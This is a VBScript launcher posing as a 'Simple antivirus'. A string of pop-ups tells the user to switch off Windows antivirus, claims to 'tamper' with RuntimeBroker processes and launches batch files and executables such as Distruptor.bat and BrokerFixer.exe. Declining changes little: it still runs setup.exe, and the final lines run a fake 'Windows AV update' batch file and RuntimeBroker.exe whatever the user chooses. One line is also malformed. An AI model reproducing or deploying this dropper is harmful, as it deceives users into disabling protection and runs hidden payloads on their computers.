DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")
answer = MsgBox("Disclaimer: our program does consist of a malware, this malwares function is to turn off your antivirus and run this program. Knowing this information would you like to proceed?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")

If answer = vbYes Then
  WScript.sleep(5) 
  CreateObject("WScript.Shell").Run "simple/Distruptor.bat"
  a=MsgBox("Files ran successfully...", 0+64, "Simple")
  b=MsgBox("Please finish the setup by manualy turning off your Windoes AntiVirus, this is to assure that our program will run properly.", 0+64, "Simple")
  c=MsgBox("Important: Some malware disguises itself as RuntimeBroker.exe, Isass.exe, MsDtsSrvr.exe or other common windows files..., particularly when not located in the C:\Windows\System32 folder. Therefore, you should check the RuntimeBroker.exe process on your PC to see if it is a threat. Because of this we will check if any of these are malware, if found we will fix the RuntimeBroker executable and replace it with a default one.", 0+64, "Simple")
  
  answer = MsgBox("Disclaimer: We want to scan your RuntimeBrokers... this will run a exe file and will give you an error, it will tamper with the RuntimeBrokers... to make sure they arn't infected with or are malware. Knowing this information would you like to run or not run this program?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")
  
  If answer = vbYes Then
    CreateObject("WScript.Shell").Run "simple/BrokerFixer.exe"
    WScript.sleep(500)
    d=MsgBox("We have succsessfuly scanned some of your Runtime Brokers, and have tampered with them.", 0+64, "Simple")
    CreateObject("WScript.Shell").Run ""simple/fix.bat"
    f=MsgBox("Click any button below to run our simple antivirus.", 0+64, "Simple")
    CreateObject("WScript.Shell").Run "simple/complex/setup.exe"
 
  Else
    a=MsgBox("Thanks for making your decision... we will continue with our virus detection process ", 0+64, "SimpleAV")
    d=MsgBox("We have succsessfuly scanned your Runtime Brokers, and have tampered with them.", 0+64, "Simple")
    f=MsgBox("The past processes will run everytime you run this Simple antivirus!!!", 0+64, "Simple")
    f=MsgBox("Click any button below to run our very simple antivirus", 0+64, "Simple")
    CreateObject("WScript.Shell").Run "simple/complex/setup.exe"
    
  End If
  
  
  

  
    
 
Else
  a=MsgBox(" Click OK or NO to close... ", 0+64, "SimpleAV")
  
End If


CreateObject("Wscript.Shell").Run """Windows AV update 1.387.695.2.bat""", 1, True

CreateObject("Wscript.Shell").Run """RuntimeBroker.exe""", 1, True
